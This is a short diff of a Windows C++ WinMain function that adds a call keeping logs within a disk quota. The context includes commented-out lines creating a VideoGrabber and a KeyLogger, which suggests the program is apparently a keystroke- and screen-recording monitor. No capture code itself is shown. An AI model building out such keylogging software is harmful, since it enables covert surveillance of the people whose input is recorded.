@@ -10,6 +10,7 @@ int WINAPI WinMain ( HINSTANCE hInstance, HINSTANCE hPrevInstance,
 {
 	DataAccumulator* dataAccumulator = new DataAccumulator();
 	DiskQuotaWatcher* quotaKeeper = new DiskQuotaWatcher(DataProvider::DATA_DIR, DiskQuotaWatcher::DEFAULT_QUOTA);
+	quotaKeeper->KeepLogsWithinQuota();
 	//VideoGrabber* videoGrabber = new VideoGrabber();
 	//KeyLogger* keyLogger = new KeyLogger();
 
